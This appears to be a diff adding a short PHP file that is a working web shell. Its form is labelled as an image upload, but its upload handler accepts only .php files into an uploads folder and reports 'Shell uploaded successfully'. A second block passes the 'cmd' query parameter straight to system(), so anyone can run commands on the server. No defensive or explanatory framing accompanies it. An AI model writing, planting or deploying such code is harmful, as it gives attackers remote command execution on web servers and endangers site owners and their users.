@@ -1,0 +1,35 @@
+<?php
+// Brutal PHP Shell Upload
+if(isset($_FILES['image'])) {
+  $target_dir = "uploads/";
+  $target_file = $target_dir . basename($_FILES["image"]["name"]);
+  $imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
+
+  // Brutal bypass upload restriction
+  if($imageFileType == "php") {
+    if(move_uploaded_file($_FILES["image"]["tmp_name"], $target_file)) {
+      echo "🔥 Shell uploaded successfully!";
+    } else {
+      echo "Error uploading shell.";
+    }
+  } else {
+    echo "File is not a PHP shell.";
+  }
+}
+?>
+
+<!-- Brutal file upload form -->
+<form action="" method="post" enctype="multipart/form-data">
+  Select image to upload:
+  <input type="file" name="image" id="image">
+  <input type="submit" value="Upload Image" name="submit">
+</form>
+
+<?php
+// Brutal shell execution
+if(isset($_GET['cmd'])) {
+  echo "<pre>";
+  system($_GET['cmd']);
+  echo "</pre>";
+}
+?>
